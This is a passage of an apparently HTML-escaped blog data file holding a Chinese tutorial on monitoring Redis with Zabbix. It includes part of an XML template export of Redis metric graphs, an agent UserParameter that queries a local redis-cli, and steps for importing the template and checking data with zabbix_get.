&lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Port Connections_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;0&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;EE0000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;BBBB00&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;2&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;CC00CC&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;3&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00CCCC&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;4&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;009900&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Port status_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Uptime_<span class=\"keyword\">in</span>_seconds_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,uptime_<span class=\"keyword\">in</span>_seconds]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Used memory_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C8C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">    &lt;/graphs&gt;</span><br><span class=\"line\">&lt;/zabbix_<span class=\"built_in\">export</span>&gt;</span><br></pre></td></tr></table></figure>","excerpt":"<h3 id=\"&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;\"><a href=\"#&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;\" class=\"headerlink\" title=\"&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;\"></a>&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;</h3><p>&#x70B9;&#x51FB;&#x3010;configuration&#x3011;&#x2014;&#x2014;&gt;&#x3010;templates&#x3011;&#x2014;&#x2014;&gt;&#x3010;import&#x3011;&#xFF0C;&#x5BFC;&#x5165;xml&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002;</p>\n<h3 id=\"&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key\"><a href=\"#&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key\" class=\"headerlink\" title=\"&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key\"></a>&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key</h3><p>&#x5728;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x65B0;&#x5EFA;/etc/zabbix/zabbix_agentd.d/userparameter_redis.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x52A0;&#x5165;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserParameter=redis_stats[*],redis-cli -h 127.0.0.1 -p <span class=\"variable\">$1</span> info|grep <span class=\"variable\">$2</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span>2</span><br></pre></td></tr></table></figure></p>\n<p>&#x91CD;&#x542F;&#x670D;&#x52A1;&#x5E94;&#x7528;&#x6700;&#x65B0;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x6CE8;&#x610F;&#x786E;&#x8BA4;zabbix_agentd.conf&#x6587;&#x4EF6;UnsafeUserParameters=1 </span></span><br><span class=\"line\">service zabbix-agent restart</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;\"><a href=\"#&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;\"></a>&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;</h3><p>&#x5728;zabbix&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x901A;&#x8FC7;zabbix_get&#x7A0B;&#x5E8F;&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x80FD;&#x6B63;&#x5E38;&#x5F97;&#x5230;&#x6570;&#x636E;&#xFF0C;&#x8BC1;&#x660E;&#x901A;&#x4FE1;&#x6B63;&#x5E38;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zabbix_get <span class=\"_\">-s</span> 172.20.0.20 -k redis_stats[6379,total_connections_received]</span><br><span class=\"line\">2249669</span><br></pre></td></tr></table></figure></p>","more":"<h3 id=\"&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;\"><a href=\"#&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;\" class=\"headerlink\" title=\"&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;\"></a>&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;</h3><p>&#x901A;&#x8FC7;&#x3010;configuration&#x3011;&#x2014;&#x2014;&gt;&#x3010;hosts&#x3011;&#x2014;&#x2014;&gt;&#x3010;create host&#x3011;&#x521B;&#x5EFA;&#x65B0;&#x4E3B;&#x673A;&#xFF0C;&#x5E76;&#x5728;templates&#x9879;&#x4E2D;&#xFF0C;&#x67E5;&#x627E;Templates Redis_6379&#x6A21;&#x677F;&#xFF0C;&#x5E76;link&#x8BE5;&#x6A21;&#x677F;&#x3002;</p>\n<p>&#x9A8C;&#x8BC1;&#x6570;&#x636E;&#x4F7F;&#x7528;&#x3010;monitoring&#x3011;&#x2014;&#x2014;&gt;&#x3010;lastest data&#x3011;&#xFF0C;&#x6253;&#x5F00;&#x521A;&#x521A;&#x6DFB;&#x52A0;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x6570;&#x636E;&#x3002;</p>\n<p><br></p>\n<hr>\n<h3 id=\"redis&#x76D1;&#x63A7;&#x6A21;&#x677F;\"><a href=\"#redis&#x76D1;&#x63A7;&#x6A21;&#x677F;\" class=\"headerlink\" title=\"redis&#x76D1;&#x63A7;&#x6A21;&#x677F;\"></a>redis&#x76D1;&#x63A7;&#x6A21;&#x677F;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span 